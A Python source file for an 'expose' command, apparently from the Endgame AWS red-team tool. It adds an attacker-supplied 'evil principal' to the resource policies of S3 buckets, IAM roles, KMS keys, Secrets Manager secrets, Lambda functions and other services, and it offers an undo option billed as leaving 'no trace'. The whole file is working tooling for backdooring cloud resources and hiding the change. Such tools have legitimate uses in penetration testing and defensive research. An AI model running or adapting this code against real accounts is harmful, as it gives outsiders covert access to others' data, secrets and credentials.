"""
List exposable resources
"""
import json
import logging
import click
import termcolor
import boto3
from policy_sentry.util.arns import (
    parse_arn_for_resource_type,
    get_resource_path_from_arn,
)
from endgame import set_log_level
from endgame.exposure_via_resource_policies import glacier_vault, sqs, lambda_layer, lambda_function, kms, cloudwatch_logs, efs, s3, \
    sns, iam, ecr, secrets_manager, ses, elasticsearch, acm_pca
from endgame.shared.aws_login import get_boto3_client, get_current_account_id
from endgame.shared import constants, utils
from endgame.shared.validate import (
    click_validate_supported_aws_service,
    click_validate_user_or_principal_arn,
)
from endgame.shared.response_message import ResponseMessage
logger = logging.getLogger(__name__)
END = "\033[0m"
GREY = "\33[90m"
CBLINK = '\33[5m'
CBLINK2 = '\33[6m'


@click.command(name="expose", short_help="Expose AWS resources")
@click.option(
    "--name",
    "-n",
    type=str,
    required=True,
    help="Specify the name of your resource",
)
@click.option(
    "--evil-principal",
    "-e",
    type=str,
    required=True,
    help="Specify the name of your resource",
    callback=click_validate_user_or_principal_arn,
    envvar="EVIL_PRINCIPAL"
)
@click.option(
    "--profile",
    "-p",
    type=str,
    required=False,
    help="Specify the AWS IAM profile.",
    envvar="AWS_PROFILE"
)
@click.option(
    "--service",
    "-s",
    type=click.Choice(constants.SUPPORTED_AWS_SERVICES),
    required=False,
    help="The AWS service in question",
    callback=click_validate_supported_aws_service,
)
@click.option(
    "--region",
    "-r",
    type=str,
    required=False,
    default="us-east-1",
    help="The AWS region",
    envvar="AWS_SERVICE"
)
@click.option(
    "--dry-run",
    "-d",
    is_flag=True,
    default=False,
    help="Dry run, no modifications",
)
@click.option(
    "--undo",
    "-u",
    is_flag=True,
    default=False,
    help="Undo the previous modifications and leave no trace",
)
@click.option(
    "-v",
    "--verbose",
    "verbosity",
    count=True,
)
def expose(name, evil_principal, profile, service, region, dry_run, undo, verbosity):
    """
    Expose AWS resources
    :param name: The name of the AWS resource.
    :param evil_principal: The ARN of the evil principal to give access to the resource.
    :param profile: The AWS profile, if using the shared credentials file.
    :param service: The AWS Service in question.
    :param region: The AWS region. Defaults to us-east-1
    :param dry_run: Dry run, no modifications
    :param undo: Undo the previous modifications and leave no trace
    :param verbosity: Set log verbosity.
    :return:
    """
    set_log_level(verbosity)

    # User-supplied arguments like `cloudwatch` need to be translated to the IAM name like `logs`
    provided_service = service
    service = utils.get_service_translation(provided_service=service)

    # Get Boto3 clients
    client = get_boto3_client(profile=profile, service=service, region=region)
    sts_client = get_boto3_client(profile=profile, service="sts", region=region)

    # Get the current account ID
    current_account_id = get_current_account_id(sts_client=sts_client)
    principal_type = parse_arn_for_resource_type(evil_principal)
    principal_name = get_resource_path_from_arn(evil_principal)

    response_message = expose_service(provided_service=provided_service, region=region, name=name, current_account_id=current_account_id, client=client, dry_run=dry_run, evil_principal=evil_principal, undo=undo)
    print_diff_messages(response_message=response_message, verbosity=verbosity)

    if undo and not dry_run:
        print_green(f"Removed the {principal_type} with ARN {evil_principal} from the resource based policy for the "
                    f"{response_message.resource_type} named {response_message.resource_name}")
    elif dry_run and not undo:
        print_red(f"Will add {principal_type} named {principal_name} to the {response_message.resource_type} {response_message.resource_name}")
    elif dry_run and undo:
        print_green(f"Will remove the {principal_type} with ARN {evil_principal} from the resource based policy for the"
                    f" {response_message.resource_type} named {response_message.resource_name}")
    else:
        print_red(f"Added the {principal_type} named {principal_name} to the {response_message.resource_type} {response_message.resource_name}")


def expose_service(
        provided_service: str,
        region: str,
        name: str,
        current_account_id: str,
        client: boto3.Session.client,
        undo: bool,
        dry_run: bool,
        evil_principal: str
) -> ResponseMessage:
    """Expose a resource from an AWS Service. You can call this function directly."""
    service = provided_service
    resource = None
    # fmt: off
    if service == "s3":
        resource = s3.S3Bucket(name=name, client=client, current_account_id=current_account_id, region=region)
    elif service == "iam":
        resource = iam.IAMRole(name=name, client=client, current_account_id=current_account_id, region=region)
    elif provided_service == "lambda":
        resource = lambda_function.LambdaFunction(name=name, client=client, current_account_id=current_account_id, region=region)
    elif provided_service == "lambda-layer":
        resource = lambda_layer.LambdaLayer(name=name, client=client, current_account_id=current_account_id, region=region)
    elif provided_service == "elasticsearch":
        resource = elasticsearch.ElasticSearchDomain(name=name, client=client, current_account_id=current_account_id, region=region)
    elif service == "efs":
        resource = efs.ElasticFileSystem(name=name, client=client, current_account_id=current_account_id, region=region)
    elif service == "secretsmanager":
        resource = secrets_manager.SecretsManagerSecret(name=name, client=client, current_account_id=current_account_id, region=region)
    elif service == "ecr":
        resource = ecr.EcrRepository(name=name, client=client, current_account_id=current_account_id, region=region)
    elif service == "ses":
        resource = ses.SesIdentityPolicy(name=name, client=client, current_account_id=current_account_id, region=region)
    elif service == "sns":
        resource = sns.SnsTopic(name=name, client=client, current_account_id=current_account_id, region=region)
    elif service == "sqs":
        resource = sqs.SqsQueue(name=name, client=client, current_account_id=current_account_id, region=region)
    elif service == "logs":
        resource = cloudwatch_logs.CloudwatchResourcePolicy(name=name, client=client, current_account_id=current_account_id, region=region)
    elif service == "kms":
        resource = kms.KmsKey(name=name, client=client, current_account_id=current_account_id, region=region)
    elif service == "glacier":
        resource = glacier_vault.GlacierVault(name=name, client=client, current_account_id=current_account_id, region=region)
    elif service == "acm-pca":
        resource = acm_pca.AcmPrivateCertificateAuthority(name=name, client=client, current_account_id=current_account_id, region=region)
    # fmt: on

    if undo and not dry_run:
        print_green("OPERATION: UNDO")
        response_message = resource.undo(evil_principal=evil_principal)
    elif dry_run and not undo:
        print_red(f"OPERATION: DRY_RUN_ADD_MYSELF")
        response_message = resource.add_myself(evil_principal=evil_principal, dry_run=dry_run)
    elif dry_run and undo:
        print_green("OPERATION: DRY_RUN_UNDO")
        response_message = resource.undo(evil_principal=evil_principal, dry_run=dry_run)
    else:
        print_red(f"OPERATION: ADD_MYSELF")
        response_message = resource.add_myself(evil_principal=evil_principal, dry_run=False)

    return response_message


def print_diff_messages(response_message: ResponseMessage, verbosity: int):
    if verbosity >= 2:
        print_grey(f"Old statement IDs: {response_message.original_policy_sids}")
        print_grey(f"Updated statement IDs: {response_message.updated_policy_sids}")

    if response_message.added_sids:
        logger.debug("Statements are being added")
        diff = response_message.added_sids
        print_yellow(f"+ Resource: {response_message.victim_resource_arn}")
        print_green(f"++ (New statements): {', '.join(diff)}")
        print_green(f"++ (Evil Principal): {response_message.evil_principal}")
    elif len(response_message.updated_policy_sids) == len(response_message.original_policy_sids):
        print_yellow(f"* Resource: {response_message.victim_resource_arn}")
        print_yellow(f"** (No new statements)")
    else:
        print_grey("Statements are being removed")
        diff = response_message.removed_sids
        print_yellow(f"- Resource: {response_message.victim_resource_arn}")
        print_red(f"-- Statements being removed: {', '.join(diff)}")

    if verbosity >= 3:
        print_grey("Original policy:")
        print_grey(json.dumps(response_message.original_policy))
        print_grey("New policy:")
        print_grey(json.dumps(response_message.updated_policy))


def print_red(string):
    termcolor.cprint(string, "red")


def print_yellow(string):
    termcolor.cprint(string, "yellow")


def print_blue(string):
    termcolor.cprint(string, "blue")


def print_green(string):
    termcolor.cprint(string, "green")


def print_grey(string):
    print(f"{GREY}{string}{END}")
    # Color code from here: https://stackoverflow.com/a/39452138
